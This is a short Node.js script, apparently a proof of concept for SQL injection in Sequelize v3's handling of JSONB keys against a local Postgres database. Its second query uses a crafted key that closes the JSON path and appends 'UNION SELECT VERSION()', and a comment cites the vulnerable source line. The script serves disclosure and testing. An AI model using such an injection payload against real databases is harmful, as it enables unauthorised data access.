const Sequelize = require('sequelize');

const sequelize = new Sequelize('someregistry', 'postgres', '', {
  host: 'localhost',
  port: '5432',
  dialect: 'postgres'
});

const Project = sequelize.define('Project', {
  name: Sequelize.DataTypes.TEXT,
  target: Sequelize.DataTypes.JSONB,
}, {
  tableName: 'projects',
});

(async () => {
  await sequelize.authenticate();

  console.log(await Project.findAll({
    where: {target: {"a": 1}},
    attributes: ['name'],
    raw: true
  }));

  console.log(await Project.findAll({
    where: {target: {"a}') = '1' UNION SELECT VERSION(); -- ": 1}},
    attributes: ['name'],
    raw: true
  }));
})();

// https://github.com/sequelize/sequelize/blob/v3/lib/dialects/abstract/query-generator.js#L2201
// $baseKey = self.quoteIdentifier(key)+'#>>\'{'+path.join(', ')+'}\'';
